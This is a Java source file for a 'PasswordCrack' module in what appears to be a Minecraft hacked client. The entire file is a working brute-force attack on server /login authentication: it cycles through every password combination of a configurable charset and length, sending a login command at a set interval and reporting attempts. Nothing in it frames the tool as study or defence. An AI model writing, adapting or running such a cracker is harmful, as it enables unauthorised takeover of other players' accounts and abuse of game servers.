package dev.oblivion.client.module.misc;

import dev.oblivion.client.event.EventHandler;
import dev.oblivion.client.event.events.TickEvent;
import dev.oblivion.client.module.Category;
import dev.oblivion.client.module.Module;
import dev.oblivion.client.setting.impl.IntSetting;
import dev.oblivion.client.setting.impl.StringSetting;
import dev.oblivion.client.util.ChatUtil;

public class PasswordCrack extends Module {
    private final StringSetting charset = settings.getDefaultGroup().add(
        new StringSetting.Builder()
            .name("Charset")
            .description("Characters to use for brute force.")
            .defaultValue("abcdefghijklmnopqrstuvwxyz0123456789")
            .build()
    );
    private final IntSetting maxLength = settings.getDefaultGroup().add(
        new IntSetting.Builder()
            .name("Max Length")
            .description("Maximum password length to try.")
            .defaultValue(4)
            .min(1)
            .max(8)
            .build()
    );
    private final IntSetting delayMs = settings.getDefaultGroup().add(
        new IntSetting.Builder()
            .name("Delay")
            .description("Delay between attempts in ms.")
            .defaultValue(500)
            .min(50)
            .max(10000)
            .build()
    );

    private int currentLength;
    private int[] indices;
    private long lastAttempt;
    private long attempts;
    private boolean finished;

    public PasswordCrack() {
        super("PasswordCrack", "Brute forces /login by trying every password combination.", Category.MISC);
    }

    @Override
    protected void onEnable() {
        currentLength = 1;
        indices = new int[currentLength];
        lastAttempt = 0;
        attempts = 0;
        finished = false;
        ChatUtil.info("PasswordCrack started. Charset: " + charset.get().length() + " chars, max length: " + maxLength.get());
    }

    @Override
    protected void onDisable() {
        if (!finished) {
            ChatUtil.warning("PasswordCrack stopped after " + attempts + " attempts.");
        }
    }

    @EventHandler
    public void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null || finished) return;

        long now = System.currentTimeMillis();
        if (now - lastAttempt < delayMs.get()) return;
        lastAttempt = now;

        String chars = charset.get();
        if (chars.isEmpty()) {
            ChatUtil.error("Charset is empty!");
            disable();
            return;
        }

        String password = buildPassword(chars);
        mc.getNetworkHandler().sendChatCommand("login " + password);
        attempts++;

        if (attempts % 100 == 0) {
            ChatUtil.info("PasswordCrack: " + attempts + " attempts so far (current: " + password + ")");
        }

        if (!advance(chars)) {
            finished = true;
            ChatUtil.error("PasswordCrack exhausted all combinations (" + attempts + " attempts).");
            disable();
        }
    }

    private String buildPassword(String chars) {
        StringBuilder sb = new StringBuilder(currentLength);
        for (int i = 0; i < currentLength; i++) {
            sb.append(chars.charAt(indices[i]));
        }
        return sb.toString();
    }

    private boolean advance(String chars) {
        int charCount = chars.length();
        for (int i = currentLength - 1; i >= 0; i--) {
            indices[i]++;
            if (indices[i] < charCount) return true;
            indices[i] = 0;
        }
        currentLength++;
        if (currentLength > maxLength.get()) return false;
        indices = new int[currentLength];
        return true;
    }
}
